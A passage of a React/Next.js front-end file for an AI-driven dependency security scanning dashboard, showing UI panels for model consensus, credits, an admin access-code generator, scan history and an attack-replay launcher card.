                    {[{ label: "Input Acquisition", color: "bg-blue-400", glow: "shadow-[0_0_8px_rgba(96,165,250,0.7)]" }, { label: "Complexity Detection", color: "bg-cyan-400", glow: "shadow-[0_0_8px_rgba(34,211,238,0.7)]" }, { label: "Model Routing", color: "bg-purple-400", glow: "shadow-[0_0_8px_rgba(192,132,252,0.7)]" }, { label: "Threat Intelligence", color: "bg-yellow-400", glow: "shadow-[0_0_8px_rgba(250,204,21,0.7)]" }, { label: "Verification Pass", color: "bg-orange-400", glow: "shadow-[0_0_8px_rgba(251,146,60,0.7)]" }, { label: "Remediation Output", color: "bg-green-400", glow: "shadow-[0_0_8px_rgba(74,222,128,0.7)]" }].map((node, i) => (
                      <div key={i} className="flex items-center gap-3 py-1.5 pl-1">
                        <div className={`w-3.5 h-3.5 rounded-full shrink-0 ${node.color} ${node.glow} animate-pulse`} style={{ animationDelay: `${i * 0.3}s` }} />
                        <span className="text-xs text-gray-300">{node.label}</span>
                      </div>
                    ))}
                  </div>
                </div>

                {/* S8: AI Consensus */}
                <div className="glass-card p-5 rounded-2xl border border-white/5 relative overflow-hidden">
                  <div className="absolute top-0 right-0 w-20 h-20 bg-purple-500/10 blur-[40px] rounded-full pointer-events-none" />
                  <div className="flex items-center gap-2 mb-4"><GitMerge className="w-4 h-4 text-orange-400" /><span className="text-xs font-bold uppercase tracking-widest text-white">AI Consensus</span></div>
                  <div className="space-y-3">
                    {[{ model: "Groq Fast", severity: "HIGH", color: "text-orange-400", bar: "bg-orange-400", pct: 70 }, { model: "Claude Deep", severity: "CRITICAL", color: "text-red-400", bar: "bg-red-400", pct: 95 }, { model: "Gemini Review", severity: "HIGH", color: "text-yellow-400", bar: "bg-yellow-400", pct: 72 }].map((m) => (
                      <div key={m.model}>
                        <div className="flex items-center justify-between mb-1"><span className="text-xs text-gray-400">{m.model}</span><span className={`text-xs font-mono font-bold ${m.color}`}>{m.severity}</span></div>
                        <div className="w-full h-1.5 bg-white/5 rounded-full overflow-hidden"><div className={`h-full ${m.bar} rounded-full`} style={{ width: `${m.pct}%` }} /></div>
                      </div>
                    ))}
                    <div className="flex items-center justify-between mt-2 pt-3 border-t border-white/10"><span className="text-xs text-gray-400">Confidence</span><span className="text-base font-mono font-black text-green-400">92%</span></div>
                  </div>
                </div>

                {/* S6: AI Performance */}
                <div className="glass-card p-5 rounded-2xl border border-white/5">
                  <div className="flex items-center gap-2 mb-4"><BarChart2 className="w-4 h-4 text-blue-400" /><span className="text-xs font-bold uppercase tracking-widest text-white">AI Performance</span></div>
                  <div className="space-y-3">
                    {[{ label: "Avg Latency", value: "1.4s" }, { label: "Orch. Speed", value: "94%" }, { label: "Tokens Used", value: "~18k" }, { label: "Efficiency", value: "High" }, { label: "Telemetry Evts", value: "312" }].map((metric) => (
                      <div key={metric.label} className="flex items-center justify-between">
                        <span className="text-xs text-gray-400">{metric.label}</span>
                        <span className="text-xs font-mono font-bold text-blue-300">{metric.value}</span>
                      </div>
                    ))}
                  </div>
                </div>

                {/* S9: Budget Guard */}
                <div className="glass-card p-5 rounded-2xl border border-white/5">
                  <div className="flex items-center gap-2 mb-4"><ShieldAlert className="w-4 h-4 text-orange-400" /><span className="text-xs font-bold uppercase tracking-widest text-white">Budget Guard</span></div>
                  <div className="space-y-2.5">
                    {[{ msg: "Efficient model selected for low-complexity scan.", color: "text-green-400", dot: "bg-green-400" }, { msg: "High-cost escalation prevented.", color: "text-yellow-400", dot: "bg-yellow-400" }, { msg: "Deep analysis routed only when required.", color: "text-blue-400", dot: "bg-blue-400" }, { msg: "Consensus reserved for CRITICAL severity.", color: "text-orange-400", dot: "bg-orange-400" }].map((item, i) => (
                      <div key={i} className="flex items-start gap-2"><span className={`w-1.5 h-1.5 rounded-full ${item.dot} mt-1.5 shrink-0`} /><span className={`text-xs font-mono ${item.color}`}>{item.msg}</span></div>
                    ))}
                  </div>
                  <div className="mt-4 pt-3 border-t border-white/5"><span className="text-xs text-gray-400 font-mono font-semibold">Runtime Governance — Enterprise Grade</span></div>
                </div>
              </div>


              {/* ADMIN CONSOLE — ONLY VISIBLE TO ADMIN */}
              {isAdmin && (
                <div className="mb-5">
                  <div className="glass-card p-6 rounded-2xl border border-yellow-500/20 relative overflow-hidden bg-yellow-500/5">
                    <div className="absolute top-0 left-0 w-full h-[2px] bg-gradient-to-r from-yellow-500 via-orange-500 to-purple-500" />
                    <div className="absolute top-0 right-0 w-32 h-32 bg-yellow-500/10 blur-[60px] rounded-full pointer-events-none" />
                    <div className="flex items-center gap-2 mb-5">
                      <div className="w-7 h-7 rounded-lg bg-yellow-500/20 border border-yellow-500/30 flex items-center justify-center">
                        <ShieldAlert className="w-4 h-4 text-yellow-400" />
                      </div>
                      <span className="text-sm font-black uppercase tracking-widest text-yellow-300">Admin Console</span>
                      <span className="ml-auto text-xs font-black bg-yellow-500 text-black px-2 py-0.5 rounded-full">FULL AUTHORITY</span>
                    </div>

                    {/* Code Generator */}
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div className="space-y-3">
                        <div>
                          <label className="text-xs text-gray-300 uppercase font-bold tracking-widest mb-1.5 block">Code Name (blank = auto)</label>
                          <input
                            type="text" value={adminCodeName} onChange={e => setAdminCodeName(e.target.value.toUpperCase())}
                            placeholder="e.g. JUDGE-2026"
                            className="w-full px-3 py-2 bg-black/40 border border-white/10 rounded-xl text-xs font-mono text-white placeholder:text-gray-600 outline-none focus:border-yellow-500/50 transition-all tracking-widest"
                          />
                        </div>
                        <div>
                          <label className="text-xs text-gray-300 uppercase font-bold tracking-widest mb-1.5 block">Credits to Grant</label>
                          <div className="flex gap-2 flex-wrap">
                            {[50, 100, 150, 200, 500].map(c => (
                              <button key={c} onClick={() => setAdminCredits(c)} className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-colors ${adminCredits === c ? "bg-yellow-500 text-black" : "bg-white/5 text-gray-400 hover:bg-white/10"}`}>{c}</button>
                            ))}
                            <input type="number" value={adminCredits} onChange={e => setAdminCredits(Number(e.target.value))} className="w-16 px-2 py-1.5 bg-black/40 border border-white/10 rounded-lg text-xs font-mono text-white outline-none focus:border-yellow-500/50 transition-all" />
                          </div>
                        </div>
                      </div>

                      <div className="space-y-3">
                        <div>
                          <label className="text-xs text-gray-300 uppercase font-bold tracking-widest mb-1.5 block">Permissions</label>
                          <div className="space-y-2">
                            <button onClick={() => setAdminEnterprise(p => !p)} className={`w-full flex items-center justify-between px-3 py-2 rounded-xl border text-xs font-medium transition-all ${adminEnterprise ? "bg-purple-500/20 border-purple-500/40 text-purple-300" : "border-white/5 text-gray-500 hover:text-gray-300"}`}>
                              <span>Enterprise Unlock</span>
                              <span className={`w-2 h-2 rounded-full ${adminEnterprise ? "bg-purple-400" : "bg-gray-600"}`} />
                            </button>
                            <button onClick={() => setAdminReplay(p => !p)} className={`w-full flex items-center justify-between px-3 py-2 rounded-xl border text-xs font-medium transition-all ${adminReplay ? "bg-orange-500/20 border-orange-500/40 text-orange-300" : "border-white/5 text-gray-500 hover:text-gray-300"}`}>
                              <span>Replay Access</span>
                              <span className={`w-2 h-2 rounded-full ${adminReplay ? "bg-orange-400" : "bg-gray-600"}`} />
                            </button>
                          </div>
                        </div>
                        <button
                          onClick={generateAdminCode} disabled={isGenerating}
                          className="w-full py-2.5 bg-gradient-to-r from-yellow-500 to-orange-500 hover:from-yellow-400 hover:to-orange-400 text-black font-black rounded-xl transition-all text-xs disabled:opacity-60 flex items-center justify-center gap-2 shadow-[0_0_20px_rgba(234,179,8,0.3)]"
                        >
                          {isGenerating ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Key className="w-3.5 h-3.5" />}
                          {isGenerating ? "Generating..." : "Generate Access Code"}
                        </button>
                      </div>
                    </div>

                    {/* Generated Codes List */}
                    {generatedCodes.length > 0 && (
                      <div className="mt-4 pt-4 border-t border-white/5">
                        <p className="text-xs text-gray-400 uppercase font-bold tracking-widest mb-2">Recently Generated</p>
                        <div className="space-y-2">
                          {generatedCodes.map((c, i) => (
                            <div key={i} className="flex items-center justify-between bg-black/40 rounded-xl px-3 py-2 border border-white/5">
                              <div>
                                <span className="text-xs font-mono font-bold text-yellow-300 tracking-widest">{c.code}</span>
                                <span className="ml-2 text-xs text-gray-300 font-medium">{c.credits} cr {c.enterprise ? "· Enterprise" : ""}</span>
                              </div>
                              <button onClick={() => copyToClipboard(c.code)} className="text-xs text-gray-300 hover:text-white transition-colors flex items-center gap-1 font-bold">
                                {copiedCode === c.code ? <><CheckCircle2 className="w-3 h-3 text-green-400" /> Copied</> : <><Copy className="w-3 h-3" /> Copy</>}
                              </button>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              )}

              {/* Sign Out */}
              <div className="flex items-center justify-between pb-6">
                {isAdmin && (
                  <Link
                    href="/admin"
                    className="flex items-center gap-2 px-5 py-2.5 text-sm font-bold text-yellow-300 bg-yellow-500/10 hover:bg-yellow-500/20 rounded-xl transition-colors border border-yellow-500/20 shadow-[0_0_15px_rgba(234,179,8,0.1)]"
                    onClick={() => setShowControlCenter(false)}
                  >
                    <ShieldAlert className="w-4 h-4" /> Admin Console
                  </Link>
                )}
                <button onClick={() => { signOut(auth); setShowControlCenter(false); }} className="ml-auto px-6 py-2.5 text-sm text-red-400 font-bold bg-red-500/10 hover:bg-red-500/20 rounded-xl transition-colors border border-red-500/20">
                  Sign Out
                </button>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
      {/* END OPERATOR CONTROL CENTER */}


      <main className="relative z-10 max-w-[1600px] mx-auto px-6 lg:px-12 py-8 w-full">
        {/* Low Credit Warning Banner */}
        {isLowCredits && (
          <motion.div
            initial={{ opacity: 0, y: -10 }}
            animate={{ opacity: 1, y: 0 }}
            className="mb-6 p-4 rounded-xl bg-orange-500/10 border border-orange-500/20 text-orange-400 flex items-center justify-between shadow-[0_0_15px_rgba(249,115,22,0.1)] relative overflow-hidden shrink-0"
          >
            <div className="absolute top-0 right-0 w-24 h-24 bg-orange-500/5 blur-xl rounded-full pointer-events-none" />
            <div className="flex items-center gap-3">
              <AlertTriangle className="w-5 h-5 text-orange-400 animate-pulse shrink-0" />
              <div>
                <p className="text-xs font-black uppercase tracking-wider font-mono">Low Runtime Credits Warning</p>
                <p className="text-[11px] opacity-80 font-mono mt-0.5">Only {userCredits} runtime credits remaining. Quota replenishment recommended to avoid threat scanning disruption.</p>
              </div>
            </div>
            <button
              onClick={() => {
                setShowControlCenter(true);
                // We'll highlight or open the credit request modal
                setTimeout(() => setShowRequestCreditsModal(true), 200);
              }}
              className="text-[10px] font-black uppercase tracking-wider bg-orange-500 text-black px-3 py-1.5 rounded-lg border border-orange-500/30 hover:bg-orange-400 transition-colors shrink-0"
            >
              Request Quota
            </button>
          </motion.div>
        )}

        {/* Credit Exhaustion Banner */}
        {isExhausted && (
          <motion.div
            initial={{ opacity: 0, y: -10 }}
            animate={{ opacity: 1, y: 0 }}
            className="mb-6 p-4 rounded-xl bg-red-500/10 border border-red-500/20 text-red-400 flex items-center justify-between shadow-[0_0_15px_rgba(239,68,68,0.1)] relative overflow-hidden shrink-0 animate-pulse"
          >
            <div className="absolute top-0 right-0 w-24 h-24 bg-red-500/5 blur-xl rounded-full pointer-events-none" />
            <div className="flex items-center gap-3">
              <AlertCircle className="w-5 h-5 text-red-400 shrink-0" />
              <div>
                <p className="text-xs font-black uppercase tracking-wider font-mono">Runtime Quota Exhausted</p>
                <p className="text-[11px] opacity-80 font-mono mt-0.5">Your available AI credits have run out. Threat scanning and attack replay modes are temporarily disabled.</p>
              </div>
            </div>
            <button
              onClick={() => setShowExhaustionModal(true)}
              className="text-[10px] font-black uppercase tracking-wider bg-red-500 text-white px-3 py-1.5 rounded-lg border border-red-500/30 hover:bg-red-400 transition-colors shrink-0"
            >
              Resolve Exhaustion
            </button>
          </motion.div>
        )}

        <div className="mb-8 flex flex-col md:flex-row md:items-end justify-between gap-6">
          <div>
            <Link href="/" className="inline-flex items-center gap-2 text-sm text-gray-400 hover:text-white transition-colors mb-6">
              <ArrowLeft className="w-4 h-4" />
              Back to Home
            </Link>
            <h1 className="text-4xl md:text-5xl font-bold tracking-tight bg-clip-text text-transparent bg-gradient-to-r from-white to-gray-500 pb-2">Security Intelligence</h1>
            <p className="text-gray-400 mt-2 max-w-xl text-lg">Upload your dependency file to generate a runtime-tracked AI security briefing.</p>
          </div>

          <div className="flex flex-col gap-4 bg-white/5 p-4 rounded-2xl border border-white/10 w-full md:w-auto backdrop-blur-sm shadow-xl">
            <div className="flex flex-col sm:flex-row gap-3 w-full">
              <label className="relative cursor-pointer flex-1 flex items-center justify-center gap-3 px-5 py-3 bg-white/5 hover:bg-white/10 rounded-xl transition-colors border border-white/5">
                <Upload className="w-5 h-5 text-blue-400 shrink-0" />
                <span className="text-sm font-medium truncate max-w-[150px]">{file ? file.name : "Upload package.json"}</span>
                <input type="file" accept=".json" onChange={handleFileChange} className="hidden" />
              </label>
              <div className="flex items-center justify-center text-[10px] text-gray-500 uppercase font-bold tracking-widest px-2">OR</div>
              <div className="flex-1 flex items-center bg-black/40 rounded-xl border border-white/10 overflow-hidden px-4 py-3 group focus-within:border-blue-500/50 transition-colors">
                <GitBranch className="w-5 h-5 text-gray-400 group-focus-within:text-blue-400 transition-colors mr-3 shrink-0" />
                <input
                  type="text"
                  suppressHydrationWarning
                  placeholder="Paste GitHub Repository URL"
                  className="bg-transparent border-none outline-none text-sm text-white w-full placeholder:text-gray-600 min-w-[250px]"
                  value={githubUrl}
                  onChange={e => setGithubUrl(e.target.value)}
                  onKeyDown={e => e.key === 'Enter' && handleScan()}
                  disabled={isScanning}
                />
              </div>
            </div>

            <button
              onClick={handleScan}
              suppressHydrationWarning
              disabled={(!file && !githubUrl) || isScanning}
              className="w-full flex items-center justify-center gap-2 bg-blue-600 hover:bg-blue-500 disabled:bg-blue-900/30 disabled:text-gray-500 disabled:border-white/5 disabled:border text-white text-sm font-medium py-3 rounded-xl transition-all shadow-[0_0_20px_rgba(37,99,235,0.4)] disabled:shadow-none hover:scale-[1.01] active:scale-[0.99]"
            >
              {isScanning ? <Loader2 className="w-5 h-5 animate-spin shrink-0" /> : <Activity className="w-5 h-5 shrink-0" />}
              {isScanning ? "Analyzing Target..." : "Initiate Intelligence Scan"}
            </button>
          </div>
        </div>

        {error && (
          <motion.div initial={{ opacity: 0, y: -10 }} animate={{ opacity: 1, y: 0 }} className="mb-8 p-4 bg-red-500/10 border border-red-500/20 rounded-xl flex items-center gap-3 text-red-400 shadow-[0_0_15px_rgba(239,68,68,0.1)]">
            <AlertTriangle className="w-5 h-5 shrink-0" />
            <p className="text-sm font-medium">{error}</p>
          </motion.div>
        )}

        {!scanResult && !isScanning && (
          <div className="space-y-8">
            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="h-[300px] flex flex-col items-center justify-center text-center p-8 glass-card rounded-[2rem] border border-white/5 relative overflow-hidden group">
              <div className="absolute inset-0 bg-[url('/grid.svg')] bg-center opacity-[0.02] group-hover:opacity-[0.05] transition-opacity duration-1000" />
              <div className="w-20 h-20 rounded-3xl bg-blue-500/10 flex items-center justify-center mb-6 border border-blue-500/20 rotate-3 shadow-[0_0_40px_rgba(59,130,246,0.15)] group-hover:rotate-6 transition-transform duration-500">
                <ShieldAlert className="w-10 h-10 text-blue-400 -rotate-3 group-hover:-rotate-6 transition-transform duration-500" />
              </div>
              <h3 className="text-2xl font-bold text-white mb-3">Awaiting Target</h3>
              <p className="text-gray-400 max-w-md text-base leading-relaxed mb-6">
                System is on standby. Provide a valid <code className="text-blue-300 font-mono text-xs bg-blue-900/30 px-1.5 py-0.5 rounded border border-blue-500/20">package.json</code>, target a public GitHub repository, or run a demo scan to initiate the CascadeFlow orchestration pipeline.
              </p>
              <button onClick={runDemoScan} suppressHydrationWarning className="flex items-center gap-2 text-xs font-bold text-white transition-all border border-blue-500/30 bg-blue-600/20 hover:bg-blue-600/40 px-6 py-3 rounded-xl hover:scale-105 active:scale-95 shadow-[0_0_20px_rgba(37,99,235,0.2)]">
                <PlayCircle className="w-4 h-4" />
                Quick Demo Scan
              </button>
            </motion.div>

            {/* LOCKED CORE DASHBOARD SECTION — DO NOT MODIFY */}
            {currentUser && (
              <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }} className="grid grid-cols-1 lg:grid-cols-3 gap-6">

                {/* User Profile Panel (Feature 1) */}
                <div className="glass-card p-6 rounded-2xl border border-white/5 relative overflow-hidden group flex flex-col justify-between h-full">
                  <div className="absolute inset-0 bg-blue-500/5 group-hover:bg-blue-500/10 transition-colors pointer-events-none" />
                  <div>
                    <div className="flex flex-col sm:flex-row items-start sm:items-center gap-4 mb-6 relative z-10">
                      <img src={computedAvatarUrl} alt="Avatar" className="w-16 h-16 rounded-full border-2 border-white/10 shrink-0 object-cover" />
                      <div className="overflow-hidden w-full">
                        <h3 className="text-lg font-bold text-white truncate">{userDoc?.displayName || currentUser.displayName || "Operator"}</h3>
                        <p className="text-sm text-gray-400 truncate">{currentUser.email}</p>
                      </div>
                    </div>
                    <div className="grid grid-cols-2 gap-3 relative z-10 mb-4">
                      <div className="bg-black/40 rounded-xl p-3 border border-white/5 text-center shadow-inner">
                        <p className="text-xs text-gray-400 uppercase font-bold tracking-wider mb-1">Total Scans</p>
                        <p className="text-xl font-mono text-blue-400 font-bold">{history.length}</p>
                      </div>
                      <div className="bg-black/40 rounded-xl p-3 border border-white/5 text-center shadow-inner">
                        <p className="text-xs text-gray-400 uppercase font-bold tracking-wider mb-1">Avg Risk</p>
                        <p className="text-xl font-mono text-green-400 font-bold">Stable</p>
                      </div>
                    </div>
                  </div>
                  <div className="relative z-10 pt-4 border-t border-white/10">
                    <p className="text-xs text-gray-400 font-mono"><span className="text-blue-400 font-bold">Status:</span> Connected to CipherKavach AI via secure token.</p>
                  </div>
                </div>

                {/* Security Trends & AI Recommendations (Feature 4 & 5) */}
                <div className="glass-card p-6 rounded-2xl border border-white/5 relative overflow-hidden flex flex-col justify-between h-full">
                  <div className="absolute top-0 right-0 w-32 h-32 bg-purple-500/10 blur-[50px] rounded-full pointer-events-none" />
                  <div className="relative z-10">
                    <div className="flex items-center justify-between mb-4">
                      <div className="flex items-center gap-2">
                        <BarChart2 className="w-5 h-5 text-blue-400" />
                        <h3 className="font-bold text-white tracking-tight">Security Trends</h3>
                      </div>
                      <span className="text-xs font-bold text-gray-400 uppercase tracking-wide">Last 7 Scans</span>
                    </div>
                    {securityTrends.length === 0 ? (
                      <div className="w-full h-16 flex items-center justify-center border border-white/5 bg-white/[0.01] rounded-xl">
                        <p className="text-xs text-gray-300 font-mono text-center font-semibold">No historical runtime data available yet.</p>
                      </div>
                    ) : (
                      <div className="w-full h-16 flex items-end gap-1.5 mb-2">
                        {securityTrends.map((trend, i) => {
                          let barColorClass = "from-green-600/20 to-green-400/40 hover:from-green-500/40 hover:to-green-300/60 border-green-400/30";
                          let textClass = "text-green-400";
                          if (trend.severity === "CRITICAL" || trend.severity === "HIGH") {
                            barColorClass = "from-red-600/20 to-red-400/40 hover:from-red-500/40 hover:to-red-300/60 border-red-400/30";
                            textClass = "text-red-400";
                          } else if (trend.severity === "MEDIUM") {
                            barColorClass = "from-yellow-600/20 to-yellow-400/40 hover:from-yellow-500/40 hover:to-yellow-300/60 border-yellow-400/30";
                            textClass = "text-yellow-400";
                          } else if (trend.severity === "LOW") {
                            barColorClass = "from-blue-600/20 to-blue-400/40 hover:from-blue-500/40 hover:to-blue-300/60 border-blue-400/30";
                            textClass = "text-blue-400";
                          }

                          return (
                            <div
                              key={i}
                              title={`${trend.name} - ${trend.count} CVEs (${trend.severity} at ${trend.date})`}
                              className={`flex-1 bg-gradient-to-t ${barColorClass} transition-all duration-500 ease-out rounded-t-sm border-t cursor-help relative group`}
                              style={{ height: trend.height }}
                            >
                              <div className="absolute bottom-full left-1/2 -translate-x-1/2 mb-2 hidden group-hover:block z-50 bg-[#0b0f19] border border-white/10 px-2 py-1 rounded text-[9px] font-mono whitespace-nowrap shadow-[0_0_15px_rgba(0,0,0,0.8)] pointer-events-none">
                                <p className="text-white font-bold">{trend.name}</p>
                                <p className={textClass}>{trend.count} Vulnerabilities</p>
                              </div>
                            </div>
                          );
                        })}
                      </div>
                    )}
                  </div>
                  <div className="mt-6 pt-4 border-t border-white/10 relative z-10">
                    <div className="flex items-center gap-2 mb-3">
                      <BrainCircuit className="w-4 h-4 text-purple-400" />
                      <p className="text-xs font-bold text-white uppercase tracking-wider">AI Recommendations</p>
                    </div>
                    <ul className="space-y-2">
                      {aiRecommendations.map((rec, idx) => (
                        <li key={idx} className="flex items-start gap-2 text-sm text-gray-300">
                          <span className={`w-1.5 h-1.5 rounded-full mt-1.5 shrink-0 ${rec.type === "critical" ? "bg-red-400" : rec.type === "warning" ? "bg-yellow-400" : "bg-blue-400"
                            }`} />
                          <span className="leading-tight">{rec.msg}</span>
                        </li>
                      ))}
                    </ul>
                  </div>
                </div>

                {/* Scan History & Saved Reports (Feature 2 & 3) */}
                {/* Scan History & Saved Reports */}
                <div className="glass-card p-6 rounded-2xl border border-white/5 relative overflow-hidden flex flex-col h-full max-h-[320px]">
                  <div className="flex items-center justify-between mb-4 shrink-0 border-b border-white/5 pb-2">
                    <div className="flex gap-4">
                      <button
                        onClick={() => setSidebarTab("history")}
                        className={`text-xs font-mono font-black uppercase tracking-wider transition-colors ${sidebarTab === "history" ? "text-blue-400 border-b-2 border-blue-400 pb-1" : "text-gray-500 hover:text-gray-300"}`}
                      >
                        Scan History
                      </button>
                      <button
                        onClick={() => setSidebarTab("saved")}
                        className={`text-xs font-mono font-black uppercase tracking-wider transition-colors ${sidebarTab === "saved" ? "text-yellow-400 border-b-2 border-yellow-400 pb-1" : "text-gray-500 hover:text-gray-300"}`}
                      >
                        Saved Reports ({savedReports.length})
                      </button>
                    </div>
                  </div>

                  <div className="flex-1 overflow-y-auto space-y-2 custom-scrollbar pr-2">
                    {sidebarTab === "history" ? (
                      history.length > 0 ? history.map((scan, i) => (
                        <div key={i} className="flex items-center justify-between p-3 bg-black/40 rounded-xl border border-white/5 hover:border-white/20 transition-colors cursor-pointer group" onClick={() => loadHistoryResult(scan)}>
                          <div className="overflow-hidden pr-2 flex-1">
                            <p className="text-sm font-bold text-white truncate group-hover:text-blue-400 transition-colors">
                              {scan.repoMetadata?.name || "package.json"}
                            </p>
                            <p className="text-[10px] text-gray-500 font-mono mt-0.5">{new Date(scan.timestamp || Date.now()).toLocaleDateString()}</p>
                          </div>
                          <div className="flex items-center gap-2">
                            <span className={`text-xs font-bold px-2 py-1 rounded border ${((scan.vulnerabilities || []) || []).some(v => v.severity === 'CRITICAL') ? 'text-red-400 border-red-500/30 bg-red-500/10' : ((scan.vulnerabilities || []) || []).some(v => v.severity === 'HIGH') ? 'text-orange-400 border-orange-500/30 bg-orange-500/10' : 'text-green-400 border-green-500/30 bg-green-500/10'}`}>
                              {((scan.vulnerabilities || []) || []).length} CVEs
                            </span>
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                setReportToDelete({ id: scan.timestamp || "", type: "history", repoName: scan.repoMetadata?.name || "package.json" });
                              }}
                              className="w-7 h-7 flex items-center justify-center rounded-lg bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/20 opacity-0 group-hover:opacity-100 transition-opacity"
                              title="Delete Scan History Item"
                            >
                              <Trash2 className="w-3.5 h-3.5" />
                            </button>
                          </div>
                        </div>
                      )) : (
                        <div className="h-full flex flex-col items-center justify-center text-center text-gray-500 space-y-2 py-8">
                          <History className="w-8 h-8 opacity-20" />
                          <span className="text-sm">No scans in history yet.</span>
                        </div>
                      )
                    ) : (
                      savedReports.length > 0 ? savedReports.map((report, i) => (
                        <div key={report.id} className="flex items-center justify-between p-3 bg-black/40 rounded-xl border border-white/5 hover:border-white/20 transition-colors cursor-pointer group" onClick={() => loadHistoryResult(report)}>
                          <div className="overflow-hidden pr-2 flex-1">
                            <div className="flex items-center gap-1.5">
                              <p className="text-sm font-bold text-white truncate group-hover:text-yellow-400 transition-colors font-mono">
                                {report.repoName || "package.json"}
                              </p>
                              {report.replayAvailable && (
                                <span className="text-[8px] font-black font-mono bg-blue-500/10 text-blue-400 px-1 py-0.2 rounded border border-blue-500/20">REPLAY</span>
                              )}
                            </div>
                            <p className="text-[10px] text-gray-500 font-mono mt-0.5">Saved {report.createdAt?.toDate?.() ? report.createdAt.toDate().toLocaleDateString() : new Date().toLocaleDateString()}</p>
                          </div>
                          <div className="flex items-center gap-2">
                            <span className={`text-[9px] font-black uppercase px-2 py-0.5 rounded border ${report.severity === 'CRITICAL' ? 'text-red-400 border-red-500/30 bg-red-500/10' : report.severity === 'HIGH' ? 'text-orange-400 border-orange-500/30 bg-orange-500/10' : 'text-green-400 border-green-500/30 bg-green-500/10'}`}>
                              {report.severity}
                            </span>
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                setReportToDelete({ id: report.id, type: "saved", repoName: report.repoName || "package.json" });
                              }}
                              className="w-7 h-7 flex items-center justify-center rounded-lg bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/20 opacity-0 group-hover:opacity-100 transition-opacity"
                              title="Delete Saved Report"
                            >
                              <Trash2 className="w-3.5 h-3.5" />
                            </button>
                          </div>
                        </div>
                      )) : (
                        <div className="h-full flex flex-col items-center justify-center text-center text-gray-500 space-y-2 py-8">
                          <FileText className="w-8 h-8 opacity-20" />
                          <span className="text-sm">No saved reports found.</span>
                        </div>
                      )
                    )}
                  </div>
                </div>

              </motion.div>
            )}

            {/* OPERATOR CONTROL CENTER SLIDE-OVER — DO NOT MODIFY */}
            {false && (// placeholder — panel moved to slide-over
              <motion.div>

                {/* Row 1: AI Credits + Model Selector + Runtime Health */}
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">

                  {/* Feature 1: AI Credit System */}
                  <div className="glass-card p-5 rounded-2xl border border-white/5 relative overflow-hidden group">
                    <div className="absolute top-0 right-0 w-24 h-24 bg-blue-500/10 blur-[40px] rounded-full pointer-events-none" />
                    <div className="flex items-center gap-2 mb-4">
                      <Zap className="w-4 h-4 text-yellow-400" />
                      <span className="text-xs font-bold uppercase tracking-widest text-white">AI Runtime Credits</span>
                    </div>
                    <div className="space-y-2.5">
                      <div className="flex items-center justify-between">
                        <span className="text-xs text-gray-400">Credits Remaining</span>
                        <span className="text-sm font-mono font-bold text-yellow-400">42 / 50</span>
                      </div>
                      <div className="w-full h-1.5 bg-white/5 rounded-full overflow-hidden">
                        <div className="h-full bg-gradient-to-r from-yellow-500 to-green-500 rounded-full" style={{ width: "84%" }} />
                      </div>
                      <div className="flex items-center justify-between">
                        <span className="text-xs text-gray-400">Deep Threat Replays</span>
                        <span className="text-sm font-mono text-orange-400 font-bold">3 used</span>
                      </div>
                      <div className="flex items-center justify-between">
                        <span className="text-xs text-gray-400">Runtime Efficiency</span>
                        <span className="text-sm font-mono text-green-400 font-bold">94%</span>
                      </div>
                      <div className="mt-3 pt-3 border-t border-white/5 text-[10px] text-gray-600 font-mono">Standard: 1cr · Replay: 3cr · Consensus: 5cr</div>
                    </div>
                  </div>

                  {/* Feature 2: Model Selection Panel */}
                  <div className="glass-card p-5 rounded-2xl border border-white/5 relative overflow-hidden">
                    <div className="flex items-center gap-2 mb-4">
                      <BrainCircuit className="w-4 h-4 text-purple-400" />
                      <span className="text-xs font-bold uppercase tracking-widest text-white">AI Analysis Mode</span>
                    </div>
                    <div className="space-y-2">
                      {[
                        { label: "Groq Fast Analysis", color: "text-green-400", active: true },
                        { label: "Claude Deep Analysis", color: "text-blue-400", active: false },
                        { label: "Gemini Security Review", color: "text-purple-400", active: false },
                        { label: "Multi-Model Consensus", color: "text-orange-400", active: false },
                      ].map((mode) => (
                        <button key={mode.label} className={`w-full flex items-center justify-between px-3 py-2 rounded-xl border text-xs font-medium transition-all ${mode.active ? "bg-white/10 border-white/20 text-white" : "border-white/5 text-gray-500 hover:text-gray-300 hover:border-white/10"}`}>
                          <span>{mode.label}</span>
                          {mode.active && <span className={`text-[10px] font-bold ${mode.color}`}>ACTIVE</span>}
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* Feature: Launch Cyber Attack Replay */}
                  <div className="glass-card p-5 rounded-2xl border border-white/5 relative overflow-hidden bg-gradient-to-br from-red-500/10 to-transparent">
                    <div className="flex items-center gap-2 mb-3">
                      <ShieldAlert className="w-4 h-4 text-red-500 animate-pulse" />
                      <span className="text-xs font-bold uppercase tracking-widest text-white">Replay Engine</span>
                    </div>
                    <p className="text-[11px] text-gray-400 mb-4 font-mono leading-relaxed">
                      Execute context-aware attack vector replay in isolated container sandboxes to visualize privilege elevation pathways.
                    </p>
                    <button
                      onClick={() => {
                        setShowReplayModal(true);
                        setReplayCurrentStage(0);
                        setReplayIsPlaying(false);
                      }}
                      className="w-full flex items-center justify-center gap-2 bg-red-500 hover:bg-red-400 text-black font-black text-xs uppercase tracking-widest px-4 py-2.5 rounded-xl transition-all shadow-[0_0_15px_rgba(239,68,68,0.3)] hover:shadow-[0_0_20px_rgba(239,68,68,0.5)]"
                    >
                      ⚡ Open Replay Console
                    </button>
                  </div>

                  {/* Feature 8: Runtime Health Status */}
                  <div className="glass-card p-5 rounded-2xl border border-white/5 relative overflow-hidden">
                    <div className="flex items-center gap-2 mb-4">
                      <Activity className="w-4 h-4 text-green-400" />
                      <span className="text-xs font-bold uppercase tracking-widest text-white">Runtime Health</span>
                    </div>
                    <div className="space-y-2.5">
                      {[
                        { label: "CascadeFlow", status: "Active" },
                        { label: "Telemetry", status: "Stable" },
                        { label: "AI Runtime", status: "Healthy" },
